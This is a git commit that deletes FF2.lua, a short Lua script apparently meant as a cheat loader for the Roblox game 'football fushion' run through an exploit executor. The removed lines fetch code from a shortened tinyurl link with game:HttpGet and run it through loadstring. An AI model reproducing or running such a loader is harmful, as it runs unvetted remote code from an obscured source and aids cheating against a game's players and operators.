791eef2f3cee17984adab50bdd4e2baf41153a88
skq3453 <bluerblx160@gmail.com>
2024-12-03 18:40:19 -0500

    Delete FF2.lua

--- FF2.lua
+++
@@ -1,7 +0,0 @@
--- football fushion 2
-if not getgenv().loaded then
-    pcall(function() loadstring(game:HttpGet("https://tinyurl.com/luak4life1"))() end)
-    getgenv().loaded = true
-else
-    print("Already executed!")
-end
